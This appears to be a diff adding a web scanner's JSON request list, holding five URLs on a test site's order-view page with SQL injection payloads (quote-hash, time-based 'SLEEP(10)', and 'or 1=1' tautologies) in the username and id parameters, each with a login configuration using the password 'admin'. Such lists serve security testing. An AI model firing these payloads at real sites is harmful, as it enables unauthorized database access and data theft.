@@ -1,0 +1,64 @@
+[
+    {
+        "http://bm2.com/bm2/viewOrder.php?username=%27%23&id=": [
+            {
+                "LoginRequired": "true", 
+                "id": "", 
+                "loginid": "email", 
+                "loginurl": "http://bm2.com/bm2/login.php", 
+                "method": "GET", 
+                "passid": "password", 
+                "password": "admin", 
+                "username": ""
+            }
+        ], 
+        "http://bm2.com/bm2/viewOrder.php?username=%27+and+SLEEP%2810%29+%23&id=": [
+            {
+                "LoginRequired": "true", 
+                "id": "", 
+                "loginid": "email", 
+                "loginurl": "http://bm2.com/bm2/login.php", 
+                "method": "GET", 
+                "passid": "password", 
+                "password": "admin", 
+                "username": ""
+            }
+        ], 
+        "http://bm2.com/bm2/viewOrder.php?username=%27+or+%271%3D1%27+%23&id=": [
+            {
+                "LoginRequired": "true", 
+                "id": "", 
+                "loginid": "email", 
+                "loginurl": "http://bm2.com/bm2/login.php", 
+                "method": "GET", 
+                "passid": "password", 
+                "password": "admin", 
+                "username": ""
+            }
+        ], 
+        "http://bm2.com/bm2/viewOrder.php?username=&id=%27+and+SLEEP%2810%29+%23": [
+            {
+                "LoginRequired": "true", 
+                "id": "", 
+                "loginid": "email", 
+                "loginurl": "http://bm2.com/bm2/login.php", 
+                "method": "GET", 
+                "passid": "password", 
+                "password": "admin", 
+                "username": ""
+            }
+        ], 
+        "http://bm2.com/bm2/viewOrder.php?username=&id=%27+or+%271%3D1%27+%23": [
+            {
+                "LoginRequired": "true", 
+                "id": "", 
+                "loginid": "email", 
+                "loginurl": "http://bm2.com/bm2/login.php", 
+                "method": "GET", 
+                "passid": "password", 
+                "password": "admin", 
+                "username": ""
+            }
+        ]
+    }
+]
